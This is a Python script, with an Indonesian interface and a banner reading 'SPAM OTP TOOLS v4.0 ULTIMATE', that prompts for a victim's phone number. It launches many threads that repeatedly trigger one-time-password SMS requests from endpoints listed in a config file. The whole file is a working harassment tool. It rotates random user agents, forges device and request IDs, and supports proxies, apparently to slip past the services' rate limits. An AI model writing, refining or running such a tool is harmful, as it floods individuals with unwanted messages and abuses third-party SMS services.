#!/usr/bin/env python3
import sys
import json
import time
import random
import threading
import requests
import hashlib
from fake_useragent import UserAgent

ua = UserAgent()

# LOAD DARI CONFIG.JSON
try:
    with open("config.json", "r") as f:
        CONFIG = json.load(f)
        ENDPOINTS = CONFIG.get("endpoints", [])
        DELAY = CONFIG.get("delay_seconds", 0.5)
except:
    print("    ❌ config.json tidak ditemukan!")
    sys.exit(1)

def generate_device_id(phone):
    raw = f"{phone}{time.time()}{random.randint(1,9999)}"
    return hashlib.md5(raw.encode()).hexdigest()[:16]

def send_otp(phone, endpoint, proxy=None):
    headers = endpoint.get("headers", {}).copy()
    headers["User-Agent"] = ua.random
    headers["X-Device-ID"] = generate_device_id(phone)
    headers["X-Request-ID"] = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    headers["Accept"] = "application/json"
    headers["Accept-Encoding"] = "gzip, deflate"
    headers["Accept-Language"] = "id-ID,id;q=0.9"
    
    data = {}
    for k, v in endpoint.get("data", {}).items():
        if v == "__PHONE__":
            data[k] = phone
        elif v == "__RANDOM__":
            data[k] = ''.join(random.choices("0123456789", k=6))
        elif v == "__TIMESTAMP__":
            data[k] = int(time.time())
        else:
            data[k] = v
    
    proxies = {"http": proxy, "https": proxy} if proxy else {}
    url = endpoint["url"]
    method = endpoint.get("method", "POST").upper()
    
    try:
        if method == "POST":
            if "x-www-form-urlencoded" in headers.get("Content-Type", ""):
                r = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=8)
            else:
                r = requests.post(url, json=data, headers=headers, proxies=proxies, timeout=8)
        else:
            r = requests.get(url, params=data, headers=headers, proxies=proxies, timeout=8)
        
        if r.status_code in [200, 201, 202, 204, 302, 303]:
            return True, r.status_code
        else:
            return False, r.status_code
    except:
        return False, "Error"

def worker(phone, count, results):
    success = 0
    for i in range(count):
        endpoint = random.choice(ENDPOINTS)
        ok, code = send_otp(phone, endpoint)
        if ok:
            success += 1
            results.append(f"✅ [{i+1}/{count}] {endpoint['name']} - {code}")
        else:
            results.append(f"❌ [{i+1}/{count}] {endpoint['name']} - {code}")
        time.sleep(random.uniform(0.3, 0.8))
    return success

def main():
    print("\n  ╔══════════════════════════════════════════╗")
    print("    ║       SPAM OTP TOOLS v4.0 ULTIMATE     ║")
    print("    ║       BY MOAN AH AH AH AH AH           ║")
    print("    ║       TOTAL ENDPOINT: 100+             ║")
    print("    ╚══════════════════════════════════════════╝\n")
    
    phone = input("    Target Phone (+62xxx/08xxx): ").strip()
    if not phone:
        print("    Phone tidak boleh kosong!")
        return
    
    if phone.startswith("0"):
        phone = "+62" + phone[1:]
    elif not phone.startswith("+"):
        phone = "+62" + phone
    
    try:
        threads = int(input("    Jumlah Thread (default 10): ") or "10")
        count = int(input("    Jumlah per thread (default 30): ") or "30")
    except:
        threads, count = 10, 30
    
    print(f"\n    🚀 Spam ke {phone} dengan {threads} threads, {count} kali/thread\n")
    
    results = []
    pool = []
    for t in range(threads):
        t_obj = threading.Thread(target=worker, args=(phone, count, results))
        t_obj.start()
        pool.append(t_obj)
    
    for t in pool:
        t.join()
    
    for res in results:
        print(f"    {res}")
    
    total = threads * count
    success_count = sum(1 for r in results if "✅" in r)
    print(f"\n    ────► SELESAI: {success_count}/{total} sukses ({success_count/total*100:.1f}%)")

if __name__ == "__main__":
    main()
